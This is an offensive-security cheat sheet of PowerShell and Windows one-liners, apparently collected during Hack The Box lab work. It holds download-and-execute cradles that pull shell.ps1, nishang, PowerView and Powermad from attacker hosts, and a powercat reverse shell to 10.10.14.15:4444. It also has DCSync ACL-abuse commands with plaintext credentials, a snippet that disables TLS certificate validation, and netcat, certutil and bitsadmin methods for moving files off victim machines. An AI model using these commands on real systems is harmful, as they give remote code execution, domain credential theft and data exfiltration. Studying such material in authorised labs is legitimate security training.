powershell -c "Invoke-WebRequest -Uri 'http://10.10.20.222:8000/shell.exe' -Outfile 'c:\Windows\Temp\shell.exe'"

powershell -c "Invoke-WebRequest -Uri 'http://10.10.20.222:8000/winPEAS.bat' -Outfile 'c:\Windows\Temp\winPEAS.bat'"


IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/Powermad.ps1')
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/PowerView.ps1')
START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.15:8080/shell.ps1')
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.15:8080/powercat.ps1');powercat -c 10.10.14.15 -p 4444 -e cmd"
powershell "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.15:8000/nishang.ps1')"

$pass = convertto-securestring 'tiezzi' -AsPlainText -Force
$cred = New-Object System.Management.automation.PSCredential('sergio', $pass)
New-PSDrive -name mydisk -PSProvider FileSystem -Credential $cred -Root \\10.10.14.6\forest

Add-DomainObjectAcl -Credential $cred -TargetIdentity htb.local -Rights DCSync

$pass = convertto-securestring 'tiezzuss' -AsPlainText -Force
$cred = New-Object System.Management.automation.PSCredential('htb\sergio', $pass)
Add-ObjectACL -PrincipalIdentity sergio -Credential $cred -Rights DCSync



#####Downloading and Uploading via PowerShell
### PowerShell 2.0+ WebClient
# Download File from Web Server
(New-Object System.Net.WebClient).DownloadFile("http(s)://<ip_addr>/<filename>","<outfile>")

# Upload File top Web Server
(New-Object System.Net.WebClient).UploadFile("http(s)://<ip_addr>/<filename>","<outfile>")


### PowerShell 5.0+ WebClient
# Download Filr from Web Server
[System.Net.WebClient]::new().DownloadFile("http(s)://<ip_addr>/<filename>","<outfile>")

# Upload File to Web Server
[System.Net.WebClient]::new().UploadFile("http(s)://<ip_addr>/<filename>","<file_path>")


### Advanced: PoorMansArmory HTTPS File Transfer Support
# Bypass the WebClient self-signed certificate check within the current session
$Bypass = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static void Bypass()
    {
        ServicePointManager.ServerCertificateValidationCallback =
            delegate
            (
                Object obj,
                X509Certificate certificate,
                X509Chain chain,
                SslPolicyErrors errors
            )
            {
                return true;
            };
    }
}
'@
Add-Type $Bypass;
[SelfSignedCerts]::Bypass();

##### USing Built-in commands
# Built in Certutil Utility
certutil -urlcache -f http://<ip_addr>/<filename> <outfile>

# Built in bitsadmin Utility
bitsadmin /TRANSFER <job_name> http://<ip_addr>/<filename> "$PWD/<outfile>"

# Native PowerShell Command
Invoke-WebRequest http://<ip_addr>/<filename> -UseBasicParsing -OutFile <outfile>

### Using ncat.exe
# Attacker: Create Listener waiting for File
nc -nvlp <port> > <outfile>

# Victim: Upload File Bytes
type <filename> | ./nc.exe <ip_addr> <port>